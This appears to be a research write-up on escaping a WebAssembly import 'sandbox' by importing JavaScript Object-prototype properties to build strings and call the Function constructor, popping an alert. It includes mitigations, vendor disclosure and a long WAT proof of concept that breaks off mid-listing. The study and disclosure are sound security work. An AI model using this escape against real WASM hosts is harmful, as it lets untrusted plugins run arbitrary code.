@@ -1,0 +1,1260 @@
+|=-----------------------------------------------------------------------=|
+|=------=[ Popping an alert from a sandboxed WebAssembly module ]=-------=|
+|=-----------------------------------------------------------------------=|
+|=--------------------------=[ Thomas Rinsma ]=--------------------------=|
+|=----------------------------=[ th0mas.nl ]=----------------------------=|
+|=-----------------------------------------------------------------------=|
+
+---[ Table of contents
+
+ 0 - Introduction
+ 1 - The WebAssembly-JavaScript interface
+ 2 - A "feature" of the specification
+ 3 - Importing from the prototype
+ 4 - Planning our escape
+ 5 - Available gadgets
+   5.1 - Dynamic function calling
+   5.2 - First steps in constructing a string
+   5.3 - Extracting named properties
+   5.4 - Obtaining individual characters
+   5.5 - Accumulating into a string
+ 6 - Keeping things JS engine-agnostic
+ 7 - Exploit recap
+ 8 - Mitigation
+ 9 - Retrospective
+10 - References 
+11 - Full PoC
+
+
+---[ 0 - Introduction
+
+This is a story about breaking a security boundary that may not have been
+intended, but that many assume exists. We will use some odd JavaScript
+features in unintended ways to help us to escape this "sandbox", eventually
+popping an alert from within an isolated WebAssembly module.
+
+Usage of WebAssembly (WASM) is becoming more common lately. Primarily, it's
+a fast, easy and secure way to run native programs on the web. However,
+it's also become popular as a way to provide plugin support or allow for
+modular components. Not just in the browser, but also server-side with
+Node.js and in entirely different stacks using stand-alone WebAssembly
+runtimes.
+
+A WASM module's only interface with the outside world is its set of
+"imports": effectively a set of external function references which the
+module can invoke. This is what makes it such a good fit for a plugin
+system: the host application can quite easily "sandbox" the WASM module by
+only allowing it access to a limited set of APIs. Or at its extreme: not
+giving it any imports, constraining the module to be entirely side-effect-
+free and relying on return values of the module's exports.
+
+Hence, it should be perfectly safe to load and run untrusted WASM modules
+in such a restricted environment, right??
+
+
+---[ 1 - The WebAssembly-JavaScript interface
+
+Let's first take a step back and explore the basics of WASM modules and how
+they're loaded from JavaScript.
+
+Here's a very simple WASM module (given in the WAT text representation).
+It defines a single import ("logger"), which it calls with the number 42:
+
+  (module
+    (import "ns" "logger" (func $logger (param i32)))
+
+    (func $main
+      i32.const 42
+      call $logger
+    )
+    (start $main)
+  )
+
+We can load and instantiate the module (in its binary form) from JavaScript
+using WebAssembly.instantiate(), specifying an importObject containing a
+helper function that performs the actual logging:
+
+  const importObject = {
+      ns: {
+          logger: (num) => {
+              console.log(`The answer is: ${num}`)
+          }
+      }
+  };
+  fetch("logger.wasm")
+      .then((response) => response.arrayBuffer())
+      .then((bytes) => WebAssembly.instantiate(bytes, importObject));
+
+A single import is given ("logger"), which resides in the "ns" namespace:
+imports are required to have a namespace, but notably this is restricted to
+be exactly one level (no more and no less).
+
+Instantiating the module will invoke its designated "start" method (if
+specified), in our case the $main function. It logs the following to the
+console:
+
+  The answer is: 42
+
+
+---[ 2 - A "feature" of the specification
+
+WASM modules statically specify the imports they require. During
+instantiation, the runtime maps each of these imports to the corresponding
+JavaScript object (it does not have to be a function). The W3C's
+"WebAssembly JavaScript Interface" specification details exactly how this
+mapping should occur [0]:
+
+1. If module.imports is not empty, and importObject is undefined, throw a
+   TypeError exception.
+2. Let imports be << >>.
+3. For each (moduleName, componentName, externtype) of module_imports,
+    1. Let o be ? Get(importObject, moduleName).
+    2. If o is not an Object, throw a TypeError exception.
+    3. Let v be ? Get(o, componentName).
+    4. If externtype is of the form func functype,
+        ... (snip) ...
+        4. Let externfunc be the external value func funcaddr.
+        5. Append externfunc to imports.
+    ... (snip) ...
+
+In other words, for each of the module's specified imports, the runtime
+attempts to use Get(importObject, moduleName) to obtain the specified
+namespace as a key (property) of the importObject, and then again uses
+Get(o, componentName) to reference the import as a key of that namespace
+object.
+
+What is Get() in this specification language? Well, if we follow its
+definition in the "ECMAScript 2026 Language Specification", we end up at
+OrdinaryGet(), which is defined to perform the following steps [1]:
+
+1. Let desc be ? O.[[GetOwnProperty]](P).
+2. If desc is undefined, then
+    a. Let parent be ? O.[[GetPrototypeOf]]().
+    b. If parent is null, return undefined.
+    c. Return ? parent.[[Get]](P, Receiver).
+3. If IsDataDescriptor(desc) is true, return desc.[[Value]].
+4. Assert: IsAccessorDescriptor(desc) is true.
+5. Let getter be desc.[[Get]].
+6. If getter is undefined, return undefined.
+7. Return ? Call(getter, Receiver).
+
+This recursive mechanism (step 2.c) follows what is known as the prototype
+chain: a form of inheritance which is core to the JavaScript language. It
+is why you can call .toString() on almost any object, for example. While it
+may be normal that this occurs here (almost all property-lookups in
+JavaScript use this mechanism), I believe that WASM import lookups are
+implicit enough that almost nobody fully thinks this through.
+
+
+---[ 3 - Importing from the prototype
+
+Why do I say this? Well, consider our importObject from before:
+
+  const importObject = {
+      ns: {
+          logger: (num) => {
+              console.log(`The answer is: ${num}`)
+          }
+      }
+  };
+
+If we use tab-completion in a JavaScript REPL, we see that it "inherits" a
+bunch of properties from the Object prototype:
+
+  > importObject.<tab>
+  importObject.__proto__             importObject.constructor
+  importObject.hasOwnProperty        importObject.isPrototypeOf
+  importObject.propertyIsEnumerable  importObject.toLocaleString
+  importObject.toString              importObject.valueOf
+
+  importObject.ns
+
+So does this mean that besides "ns", all of these other properties can also
+be imported as WASM namespaces?! Yes :)
+
+To demonstrate this, we can modify our example to import
+importObject.toString.constructor (the Function constructor) as a global
+object, and pass that to $logger instead of 42. We also have to slightly
+change the import of $logger such that it takes an externref instead of an
+i32: this can be used to represent arbitrary external (JavaScript) values;
+WASM cannot operate on them, but they can be passed along.
+
+  (module
+    (import "ns" "logger" (func $logger (param externref)))
+    (import "toString" "constructor" (global $oops externref))
+
+    (func $main
+      global.get $oops
+      call $logger
+    )
+    (start $main)
+  )
+
+Running this module now logs the following to console:
+
+  The answer is: function Function() { [native code] }
+
+...which is indeed the (string form) of the Function constructor!
+
+This is problematic for someone trying to limit the module's interface to
+the outside world as it gives the attacker a bunch of "bonus" imports to
+play with. Even if importObject is entirely empty ({}).
+
+
+---[ 4 - Planning our escape
+
+Obviously the next step is to figure out which extra powers this gives us.
+
+Above, we imported importObj.toString.constructor as a value, but of course
+we could also import it as a function. The Function constructor is actually
+quite interesting as it behaves similarly to eval(), though with an extra
+step of indirection:
+
+  > x = Function("console.log(42)")
+  [Function: anonymous]
+  > x()
+  42
+
+So, if we can somehow (1) pass a string argument containing our JavaScript
+payload and (2) invoke the returned value as a function, then this would
+give us a full escape to JavaScript. This is not that easy however.
+
+For problem (1), the issue is that WASM does not have a string type. At
+best we can specify importObj.toString.constructor to take an i32 as
+argument, and this will work, but this does not get us very far (the
+integer will be converted to a string, but "42" is not a very useful piece
+of JavaScript). This means that we need to find a way to use the other
+available "gadgets" from the Object prototype to craft arbitrary strings.
+Once we have a way to get a JavaScript string, we can pass it to the
+Function constructor as an externref.
+
+For problem (2), the challenge is that WASM does not really have a concept
+of external function pointers. Or at least, not in the sense that we can
+take the return value of an external function and call that directly.
+The standard keeps evolving and this might be possible in the near future,
+but for now we're stuck with an "externref" which we cannot invoke
+directly. Hence, we also need to find a gadget that can do this for us.
+
+Let's have a look at what we have available.
+
+
+---[ 5 - Available gadgets
+
+We can group the set of prototype-inherited properties of importObject
+(i.e., of the Object prototype) into the following categories:
+
+- hasOwnProperty, isPrototypeOf, propertyIsEnumerable,
+  toLocaleString, toString, valueOf
+    - Regular instance methods, each containing the same second-level
+      properties provided by the Function prototype (e.g.
+      importObject.hasOwnProperty.apply) 
+- constructor
+    - the Object constructor, containing the same as the other functions
+      above, but also a bunch of static methods
+- __proto__
+    - the only non-function property, containing all of the above on the
+      second level (e.g., importObject.__proto__.hasOwnProperty)
+
+In JavaScript, methods are invoked on an object instance using the dot
+syntax (foo.bar()), which implicitly sets "this". When you take a method
+by itself and call it separately, the value of "this" is not retained:
+
+  > x = "hello";
+  > x.toString();
+  "hello"
+  > y = x.toString;
+  > y();
+  Uncaught TypeError: String.prototype.toString requires that 'this' be a
+    String at toString (<anonymous>)
+
+This same holds for our imported methods. While we can for example import
+and call importObj.__proto__.toString, it is of not much use to us, as we
+cannot control the value of "this" (it will be undefined). Hence, the only
+useful functions that remain are static ones. Namely, the Function
+constructor and all of the static methods on the Object constructor (a.k.a.
+the Object global):
+
+  Object.assign                     Object.create
+  Object.defineProperties           Object.defineProperty
+  Object.entries                    Object.freeze
+  Object.fromEntries                Object.getOwnPropertyDescriptor
+  Object.getOwnPropertyDescriptors  Object.getOwnPropertyNames
+  Object.getOwnPropertySymbols      Object.getPrototypeOf
+  Object.groupBy                    Object.hasOwn
+  Object.is                         Object.isExtensible
+  Object.isFrozen                   Object.isSealed
+  Object.keys                       Object.length
+  Object.name                       Object.preventExtensions
+  Object.prototype                  Object.seal
+  Object.setPrototypeOf             Object.values
+
+
+----[ 5.1 Dynamic function calling
+
+At first these all seem relatively boring, but an unexpected hero here is
+Object.groupBy() [2]:
+
+  Object.groupBy(items, callbackFn)
+  
+  "The Object.groupBy() static method groups the elements of a given
+  iterable according to the string values returned by a provided callback
+  function. The returned object has separate properties for each group,
+  containing arrays with the elements in the group."
+
+This relatively new addition to the JavaScript language does a bunch of
+things we'll end up needing. Most importantly it will call a function for
+us, solving the second problem from before.
+
+For example, if we somehow manage to obtain a useful Function instance, we
+can call it like this to run the JavaScript code:
+
+  x = Function("alert('hello world')"); // assuming we have this string
+  Object.groupBy([1],x) // will call x for us
+
+This only leaves us with the first problem: constructing an arbitrary
+string. It turns out that this is the hard part.
+
+
+----[ 5.2 First steps in constructing a string
+
+The method String.fromCharCode immediately comes to mind. It returns a
+string consisting of one or more UTF-16 code units passed as arguments:
+
+  > String.fromCharCode(0x41, 0x42, 0x43)
+  'ABC'
+
+This would be perfect for us, as integers are no problem for WASM. Though,
+the problem is of course that fromCharCode is part of the String global,
+not Object. Luckily, there is a way to obtain it. We'll need to perform the
+following operations, sketched out in JavaScript for readability:
+
+  // Obtain any string
+  str = "foobar";
+  // Get the String constructor (i.e. the String global)
+  string_constructor = str.constructor;
+  // Get String.fromCharCode
+  fromCharCode = string_constructor.fromCharCode;
+
+Obtaining an initial string is a bit tricky, but doable. For example, to
+get the literal string "length", we can do the following:
+
+  empty_object = importObject.constructor.prototype; // {}, importable
+  empty_array = Object.values(empty_object); // []
+  Object.getOwnPropertyNames(empty_array); // [ 'length' ]
+
+The result is still wrapped in an array, but we can use Object.groupBy to
+help with that. A key insight here is that we can craft arbitrary callback
+functions because it is perfectly legal to pass a WASM function using
+ref.func instead of a JavaScript function reference (an externref). So, we
+could craft a "save-the-nth-element" function by looking at the second
+argument passed to the callback, the index. In pseudo-JavaScript:
+
+  g_n = null;
+  save_first_elem = (x, i) => (if(i == 0) {g_n = x});
+  arr = [ 'length' ];
+  Object.groupBy(arr, save_first_elem);
+  // g_n == 'length'
+
+Generalized, we can define $array_get_nth_element as follows in WASM:
+
+  ;; Callback to use with Object.groupBy() to extract element $n to $g_n.
+  (func $save_nth_element (param $val externref) (param $n i32)
+    (local.get $n)
+    (global.get $g_n)
+    i32.eq
+    (if
+      (then
+        (local.get $val)
+        (global.set $g_nth_element)
+      )
+    )
+  )
+
+  ;; Given $arr and $n, return $arr[n]
+  (func $array_get_nth_element (param $arr externref) (param $n i32)
+                               (result externref)
+    (local.get $n)
+    (global.set $g_n)
+    (call $groupBy_i (local.get $arr) (ref.func $save_nth_element))
+    drop
+    (global.get $g_nth_element)
+  )
+
+We use the name $groupBy_i to indicate the case where we pass an internal
+(WASM) function, whereas we will use $groupBy_e for calling external
+function references. Luckily, it is perfectly fine to import the same name
+twice with different types!
+
+  (import "constructor" "groupBy" (func $groupBy_i
+    (param externref) (param funcref) (result externref)))
+  (import "constructor" "groupBy" (func $groupBy_e
+    (param externref) (param externref) (result externref)))
+
+So, using this mechanism, the string "length" can be grabbed as follows:
+
+  ;; Obtain the string 'length'
+  ;; Luckily it is the only enumerable object of an empty array, so idx: 0
+  (call $array_get_nth_element
+    (call $getOwnPropertyNames
+      (call $values (global.get $prototype))
+    )
+    (i32.const 0)
+  )
+  (global.set $s_length)
+
+
+----[ 5.3 Extracting named properties
+
+Next, we need a way to access named properties (e.g. .constructor and
+.fromCharCode) of an object.
+
+For this, we can use Object.getOwnPropertyDescriptors() to get an
+"expanded" version of the object, with all of its properties as
+descriptors. Running Object.values() on that then gives these descriptors
+as a list:
+
+  > Object.values(Object.getOwnPropertyDescriptors(string_constructor))
+  [
+    {
+      value: 'String',
+      writable: false,
+      enumerable: false,
+      configurable: true
+    },
+    {
+      value: [Function: fromCharCode],
+      writable: true,
+      enumerable: false,
+      configurable: true
+    },
+    {
+      value: [Function: fromCodePoint],
+      writable: true,
+      enumerable: false,
+      configurable: true
+    },
+    ...
+  ]
+
+If we know the order of this list, it is then purely a matter of using our
+$array_get_nth_element function (e.g., with index 1), giving us just the
+descriptor we want:
+
+  {
+    value: [Function: fromCharCode],
+    writable: true,
+    enumerable: false,
+    configurable: true
+  }
+
+We then run Object.values() on this and use $array_get_nth_element again
+(with index 0) to get the property value we desire (here, the fromCharCode
+function itself). In reality, the order of this list differs per JavaScript
+engine but we'll solve that problem later.
+
+
+----[ 5.4 Obtaining individual characters
+
+Now that we have a reference to String.fromCharCode, we can call it with
+Object.groupBy():
+
+  > Object.groupBy([0x42], String.fromCharCode)
+  { 'B\x00': [ 66 ] }
+
+The fact that the return value is given as a key of an object is not a
+problem, we can use Object.keys() and $array_get_nth_element for that. The
+\x00 (due to Object.groupBy() passing the element's index as the second
+argument of String.fromCharCode) can also be removed by taking the first
+"element" (i.e., character) of the string using $array_get_nth_element,
+leaving us with just the string 'B'.
+
+To wrap the input value (0x42) in an array for use with Object.groupBy(),
+we perform some more trickery: another call to Object.groupBy() with a WASM
+callback allows us to produce the object { "66": ["length"] }, which we can
+turn into [ "66" ] using Object.keys(). The fact that our number is now a
+string is luckily not a problem for String.fromCharCode (it will implicitly
+call .valueOf()).
+
+Chaining this all together allows us to write the following $chr function:
+
+  ;; A convoluted way to call String.fromCharCode on a single number.
+  (func $chr (param $c i32) (result externref)
+    (local $tmp externref)
+
+    ;; This is just a way to get an array with one element,
+    ;; so groupBy invokes the callback just once.
+    (call $getOwnPropertyNames (call $values (global.get $prototype)))
+    (local.set $tmp) ;; [ 'length' ]
+
+    ;; First we call Object.groupBy() on a single-element array, with a
+    ;; callback that returns a fixed value ($c), to create an object with
+    ;; just that key. For example, for 66 we'd obtain { "66": ["length"] }
+    (local.get $c)
+    (global.set $g_val_i)
+    (call $groupBy_i (local.get $tmp) (ref.func $return_val_i))
+
+    ;; Then, we call String.fromCharCode on it by passing e.g. [ "66" ]
+    ;; (the result of Oject.keys()) to Object.groupBy()
+    (call $groupBy_e
+      (call $keys)
+      (global.get $String_constructor_fromCharCode)
+    )
+
+    ;; Now Object.keys() gives ['A\x00'], so we do _[0][0] to get just 'A'
+    (call $keys)
+    (i32.const 0)
+    (call $array_get_nth_element)
+    (i32.const 0)
+    (call $array_get_nth_element)
+  )
+
+
+----[ 5.5 Accumulating into a string
+
+With individual character-strings now available to us, we need a way to
+concatenate them. The first step is a method of accumulating characters
+into a list. For this, we can use the merge primitive provided by
+Object.assign():
+
+  > Object.assign({"foo":"bar"}, {"lorem": "ipsum"})
+  { foo: 'bar', lorem: 'ipsum' }
+
+We'll assign each character to a unique, incrementing key (property name),
+accumulating them on a single object (though, each value will be wrapped in
+an array):
+
+  ;; Adds $value to obj, under a new unique (incrementing) key
+  ;; This is so we can accumulate values with unique incrementing keys on
+  ;; an object, used to build an array later.
+  (func $add_value_to_obj (param $obj externref) (param $value externref)
+    (local $tmp externref)
+
+    ;; Create a new object ($tmp) which has just a single property with a
+    ;; controlled value ($value) and a unique key (the return value of the
+    ;; callback tells Object.groupBy what property name to use)
+    (call $groupBy_i (local.get $value) (ref.func $return_incr_ctr))
+    (local.set $tmp)
+
+    ;; Use Object.assign() to add the property to $obj
+    (call $assign (local.get $obj) (local.get $tmp))
+  )
+
+After calling this multiple times, this will result in an object such as:
+
+  {
+    '1': [ 'H' ],
+    '2': [ 'e' ],
+    '3': [ 'l' ],
+    '4': [ 'l' ],
+    '5': [ 'o' ]
+  }
+
+Which we then turn into a list with Object.values()
+
+  [ [ 'H' ], [ 'e' ], [ 'l' ], [ 'l' ], [ 'o' ] ]
+
+How is this useful to us? Well:
+
+  > String.raw({raw:[['H'],['e'],['l'],['l'],['o']]})
+  'Hello'
+
+This function is normally used under the hood with raw template literals,
+but it is perfect for our use-case. Its argument should be an object
+containing a "raw" property with the array of string-parts to concatenate.
+The fact that each element is wrapped in an array by itself is no problem:
+the implicit .toString() will strip them:
+
+  > ['A'].toString()
+  'A'
+
+Obtaining a reference to String.raw() is done in the same way we obtained
+String.fromCharCode(), and creating the argument object is again possible
+with Object.groupBy() and a custom callback:
+
+> Object.groupBy([['H'],['e'],['l'],['l'],['o']], () => "raw")
+{
+  raw: [ [ 'H' ], [ 'e' ], [ 'l' ], [ 'l' ], [ 'o' ] ]
+}
+
+To invoke String.raw() we use Object.groupBy() again, but it means we have
+to wrap our object (the argument to String.raw()) in an array. One way to
+achieve this is by obtaining an existing array containing a single object,
+and using Object.assign() to merge our own object into that inner object.
+All in all, we end up at the following WASM for $list_to_string:
+
+
+  ;; Turns a list such as [["a"],["b"],["c"],["d"]] into ["a0bcd"]
+  ;;   (yes, the "0" is added due to how we use Object.groupBy)
+  ;;   (yes, it returns an array, but this is fine for our usecase)
+  (func $list_to_string (param $list externref) (result externref)
+    (local $arrwithobj externref)
+    (local $innerobj externref)
+    (local $res externref)
+
+    ;; Create an object with the key "raw", with as value our input list
+    ;; because String.raw uses this key to build the string. (groupBy wraps
+    ;; grouped elements in a list, but they all group to the same key so it
+    ;; gives back the original list)
+    (global.get $s_raw)
+    (global.set $g_val_e)
+    (call $groupBy_i (local.get $list) (ref.func $return_val_e))
+    (local.set $res)
+
+    ;; This is just a way to get an array with a single object. We need
+    ;; this as we want to give the object as a parameter to String.raw(),
+    ;; but it needs to be wrapped in an array for the Object.groupBy trick.
+    (call $values (call $getOwnPropertyDescriptors (local.get $res)))
+    (local.set $arrwithobj)
+
+    ;; Grab the inner object, for the purpose of modifying it
+    (call $array_get_nth_element (local.get $arrwithobj) (i32.const 0))
+    (local.set $innerobj)
+
+    ;; Merge 'res' into it (our object with the raw key)
+    (call $assign (local.get $innerobj) (local.get $res))
+
+    ;; Now we can invoke String.raw via Object.groupBy
+    (call $groupBy_e (local.get $arrwithobj)
+      (global.get $String_constructor_raw)
+    )
+
+    ;; The result is in the key of the returned object, so extract that
+    (call $keys)
+  )
+
+
+---[ 6 - Keeping things JS engine-agnostic
+
+Important to our "exploit" is the ability to obtain a known property from
+an object instance. We did this by taking the n-th element of the object's
+property descriptors, but this order is not specified by the standard, and
+hence differs per JavaScript engine.
+
+Luckily there's a way to generalize this. As long as our desired property
+name has a unique length (for example, "raw" is the only property of String
+with a name of length 3), we can search through the property list for a
+name with that expected length.
+
+To get the length of a string we can use Object.getOwnPropertyDescriptor()
+with the argument "length", for example:
+
+  // "length" is the only string we get for free (only prop of an array)
+  > Object.getOwnPropertyDescriptor("raw", "length")
+  { value: 3, writable: false, enumerable: false, configurable: false }
+
+Then, it's a matter of obtaining the "value" property of the descriptor,
+but this leads us back to the original problem... There's a workaround
+though: for the property descriptor of "length".length, we know that its
+value is 6:
+
+> Object.getOwnPropertyDescriptor("length","length")
+{ value: 6, writable: false, enumerable: false, configurable: false }
+> Object.values(Object.getOwnPropertyDescriptor("length","length"))
+[ 6, false, false, false ]
+
+Hence, we can use Object.groupBy() to find the index of 6 within this list
+(save the index whose element equals 6): this is the index of the "value"
+key in all property descriptors! Are you still following? ;)
+
+This completes the circle, and gives us a fully browser/engine-independent
+method of accessing object properties (as long as their length is unique).
+
+
+---[ 7 - Exploit recap
+
+To recap, our exploit consists of the following steps:
+
+0. Import a bunch of static methods under Object using the prototype-
+   inherited "constructor" namespace, e.g. `"constructor" "groupBy"`.
+1. Obtain "length" and use it to obtain references to
+   String.fromCharCode(), String.raw(), and the string "raw".
+2. Use String.fromCharCode() combined with Object.groupBy(),
+   Object.assign(), Object.keys() and Object.values() (among others) to
+   turn individual numbers into a list of characters making up our payload.
+3. Use String.raw() to combine the above into a single string.
+4. Call the Function constructor with our payload as an argument and then
+   use Object.groupBy() to call its return value, executing our payload.
+
+We combine all of this in a WASM module which executes it on load. It means
+that the payload will be executed as soon as the following code is loaded
+by the browser (note the empty importObject):
+
+  <script>
+    fetch("payload.wasm")
+      .then((response) => response.arrayBuffer())
+      .then((bytes) => WebAssembly.instantiate(bytes, {}));
+  </script>
+
+The result: an alert pops up, stating "hi from WASM" :)
+
+The full WAT code for payload.wasm is included at the end of this article.
+
+
+---[ 8 - Mitigation
+
+For a developer wanting to safely run untrusted WASM modules, the solution
+is simple: make sure the importObject and every namespace inside has a
+null-prototype:
+
+  const importObject = Object.assign(Object.create(null), {
+    "ns": Object.assign(Object.create(null), {
+      "logger": ...
+    })
+  })
+
+Alternatively, you can manually inspect a WASM module's desired imports
+before instantiating it [3] and refuse to run anything with imports that
+you don't expect.
+
+A process is currently ongoing to standardize an imports/exports interface,
+known as WASI [4]. Some of these interfaces claim to provide levels of
+(file-system) sandboxing, but it is good to know that this might be entirely
+negated by this sandbox escape. For example, Node's experimental node:wasi
+module [5] provides wasi.getImportObject() which will generate the required
+importObject for you, but it gives it the regular Object prototype. :)
+
+In their defense, they state:
+
+> The node:wasi module does not currently provide the comprehensive file
+> system security properties provided by some WASI runtimes.
+
+
+---[ 9 - Retrospective
+
+Crafting this exploit has been a very enjoyable challenge. To me, this is
+what hacking is truly about: first, the rush of finding out about this
+prototype-import "loophole", and then slowly building the sandbox escape
+piece-by-piece out of functions which were not intended for this at all.
+
+I reported this as a security issue to the Firefox, Chrome, WebKit and Node
+teams in parallel. All roughly concluded the same thing: this is odd, but
+currently within specification, and this "sandbox" is not technically a
+security boundary that WASM was designed for (within the browser at least).
+There is some desire for modifying the specification in the future, but
+this is of course difficult to do in a backward-compatible manner.
+
+This means it is currently still a feature, and we can enjoy it while it
+lasts! I would love to see if anyone can find other gadgets which can help
+simplify the payload; I'm sure there are other possible paths to take.
+
+My thanks go to Ryan Hunt at Mozilla for being supportive and helping to
+coordinate discussion between vendors. And finally, a shout out to my
+friend Kevin Valk for being a rubber ducky while I was stuck finding the
+right primitives, and for helping to document the PoC.
+
+
+---[ 10 - References 
+
+[0] https://webassembly.github.io/spec/js-api/#read-the-imports
+[1] https://tc39.es/ecma262/multipage/abstract-operations.html#sec-get-o-p
+[2] https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/groupBy
+[3] https://developer.mozilla.org/en-US/docs/WebAssembly/Reference/JavaScript_interface/Module/imports_static
+[4] https://wasi.dev/
+[5] https://nodejs.org/api/wasi.html
+
+
+---[ 11 - Full PoC
+
+
+;; (Compile using `wasm-as -all`. Requires a newish version of Binaryen)
+(module
+  ;; Static methods in the Object constructor, which we can call directly
+  (import "constructor" "keys"
+    (func $keys (param externref)(result externref)))
+  (import "constructor" "values"
+    (func $values (param externref) (result externref)))
+  (import "constructor" "getOwnPropertyNames"
+    (func $getOwnPropertyNames (param externref) (result externref)))
+  (import "constructor" "getOwnPropertyDescriptor"
+    (func $getOwnPropertyDescriptor (param externref) (param externref)
+      (result externref)))
+  (import "constructor" "getOwnPropertyDescriptors"
+    (func $getOwnPropertyDescriptors (param externref) (result externref)))
+  (import "constructor" "getPrototypeOf"
+    (func $getPrototypeOf (param externref) (result externref)))
+  (import "constructor" "constructor"
+    (func $constructor (param externref) (result externref)))
+  (import "constructor" "assign"
+    (func $assign (param externref) (param externref)))
+
+  ;; Two variants of groupBy: with a WASM or JS function as callback, resp.
+  (import "constructor" "groupBy" (func $groupBy_i
+    (param externref) (param funcref) (result externref)))
+  (import "constructor" "groupBy" (func $groupBy_e
+    (param externref) (param externref) (result externref)))
+
+  ;; We just use this as an object so import as 'global'
+  (import "constructor" "prototype" (global $prototype externref))
+
+  ;; Offsets of specific keys within certain objects.
+  ;; The exact indices are determined later and written here, for now just
+  ;; initialize to zero.
+  ;; 'constructor' in Object prototype
+  (global $OFF_CONSTRUCTOR (mut i32) (i32.const 0))
+  ;; 'value' in descriptor objects
+  (global $OFF_VALUE (mut i32) (i32.const 0))
+  ;; 'fromCharcode' in String constructor
+  (global $OFF_FROMCHARCODE (mut i32) (i32.const 0))
+   ;; 'raw' in String constructor
+  (global $OFF_RAW (mut i32) (i32.const 0))
+
+  ;; Obtained strings
+  (global $s_length (mut externref) (ref.null extern))
+  (global $s_constructor (mut externref) (ref.null extern))
+  (global $s_fromCharCode (mut externref) (ref.null extern))
+  (global $s_raw (mut externref) (ref.null extern))
+
+  ;; Obtained functions
+  (global $String_constructor (mut externref) (ref.null extern))
+  (global $String_constructor_raw (mut externref) (ref.null extern))
+  (global $String_constructor_fromCharCode(mut externref)(ref.null extern))
+
+  ;; The reference index for the callbacks below (input)
+  (global $g_n (mut i32) (i32.const 0))
+
+  ;; The extracted (saved) element, used by the callbacks below (output)
+  (global $g_nth_element (mut externref) (ref.null extern))
+  (global $g_nth_element_i (mut i32) (i32.const 0))
+
+  ;; Callback to be used with Object.groupBy() to extract an element.
+  ;; Object.groupBy() invokes callback(elem, idx) for every element in the
+  ;; array.
+  (func $save_nth_element (param $val externref) (param $n i32)
+    (local.get $n)
+    (global.get $g_n)
+    i32.eq
+    (if
+      (then
+        (local.get $val)
+        (global.set $g_nth_element)
+      )
+    )
+  )
+
+  ;; Same as above but saves an i32 instead of externref
+  (func $save_nth_element_i (param $val i32) (param $n i32)
+    (local.get $n)
+    (global.get $g_n)
+    i32.eq
+    (if
+      (then
+        (local.get $val)
+        (global.set $g_nth_element_i)
+      )
+    )
+  )
+
+  ;; Helper around the groupBy trick to access arr[n]
+  (func $array_get_nth_element (param $arr externref) (param $n i32)
+                               (result externref)
+    (local.get $n)
+    (global.set $g_n)
+    (call $groupBy_i (local.get $arr) (ref.func $save_nth_element))
+    drop
+    (global.get $g_nth_element)
+  )
+
+  ;; Same as $array_get_nth_element but result is i32
+  ;; This is useful if we want to do something with the result in WASM land
+  ;; (e.g. compare it to another integer)
+  (func $array_get_nth_element_i (param $arr externref) (param $n i32)
+                                 (result i32)
+    (local.get $n)
+    (global.set $g_n)
+    (call $groupBy_i (local.get $arr) (ref.func $save_nth_element_i))
+    drop
+    (global.get $g_nth_element_i)
+  )
+
+  ;; Helper to obtain the n-th property (usually a method) of an object
+  ;; NOTE: this order is JS-engine specific, hence we figure out offset
+  ;;       dynamically later
+  ;; NOTE2: you'd think we can call Object.values() instead (and not need
+  ;;       'value'), but it only lists enumerable properties. In our case,
+  ;;        we would like to access any property.
+  (func $object_get_nth_property (param $obj externref) (param $n i32)
+                                 (result externref)
+    (local $descriptor_vals externref) ;; for readability
+
+    (call $values (call $getOwnPropertyDescriptors (local.get $obj)))
+    (local.set $descriptor_vals)
+
+    (call $values 
+      (call $array_get_nth_element
+        (local.get $descriptor_vals)
+        (local.get $n)
+      )
+    )
+    (global.get $OFF_VALUE)
+    (call $array_get_nth_element)
+  )
+
+  (func $object_get_named_property (param $obj externref)
+                                   (param $key externref)
+                                   (result externref)
+    (call $getOwnPropertyDescriptor (local.get $obj) (local.get $key))
+    call $values
+    (global.get $OFF_VALUE)
+    call $array_get_nth_element
+  )
+
+
+  ;; Callbacks that return a fixed (but configurable) value, i.e. ()=>42
+  ;; We need versions with JS objects and with an int. These are used
+  ;; together with Object.groupBy() to be able to set an arbitrary key on
+  ;; the resulting object.
+  (global $g_val_e (mut externref) (ref.null extern))
+  (func $return_val_e (result externref)
+    (global.get $g_val_e)
+  )
+  (global $g_val_i (mut i32) (i32.const 0))
+  (func $return_val_i (result i32)
+    (global.get $g_val_i)
+  )
+
+  ;; Callback that returns a static (incrementing) value each time.
+  ;; Used by $add_value_to_obj.
+  (global $g_key_ctr (mut i32) (i32.const 0))
+  (func $return_incr_ctr (result i32)
+    (global.get $g_key_ctr)
+    (i32.const 1)
+    i32.add ;; increment
+    (global.set $g_key_ctr)
+    (global.get $g_key_ctr) ;; return
+  )
+
+  ;; Adds $value to obj, under a new unique (incrementing) key
+  ;; This is so we can accumulate values with unique incrementing keys on
+  ;; an object, used to build an array later.
+  (func $add_value_to_obj (param $obj externref) (param $value externref)
+    (local $tmp externref)
+
+    ;; Create a new object ($tmp) which has just a single property with a
+    ;; controlled value ($value) and a unique key (the return value of the
+    ;; callback tells Object.groupBy what property name to use)
+    (call $groupBy_i (local.get $value) (ref.func $return_incr_ctr))
+    (local.set $tmp)
+
+    ;; Use Object.assign() to add the property to $obj
+    (call $assign (local.get $obj) (local.get $tmp))
+  )
+
+  ;; A convoluted way to call fromCharCode on a single number.
+  (func $chr (param $c i32) (result externref)
+    (local $tmp externref)
+
+    ;; This is just a way to get an array with one element,
+    ;; so groupBy invokes the callback just once.
+    (call $getOwnPropertyNames (call $values (global.get $prototype)))
+    (local.set $tmp) ;; [ 'length' ]
+
+    ;; First we call Object.groupBy() on a single-element array, with a
+    ;; callback that returns a fixed value ($c), to create an object with
+    ;; just that key. For example, for 65 we'd obtain { "65": ["length"] }
+    (local.get $c)
+    (global.set $g_val_i)
+    (call $groupBy_i (local.get $tmp) (ref.func $return_val_i))
+
+    ;; Then, we call Object.fromCharCode on it by passing e.g. [ "65" ] to
+    ;; Object.groupBy(). (Object.keys will wrap it in an array for us)
+    (call $groupBy_e
+      (call $keys)
+      (global.get $String_constructor_fromCharCode)
+    )
+
+    ;; Now Object.keys() gives ['A\x00'], so we do _[0][0] to get just 'A'
+    (call $keys)
+    (i32.const 0)
+    (call $array_get_nth_element)
+    (i32.const 0)
+    (call $array_get_nth_element)
+  )
+
+  ;; Basically adds String.fromCharCode($c) as a new value with unique key
+  ;; to $obj, allowing us to accumulate characters to convert to a string
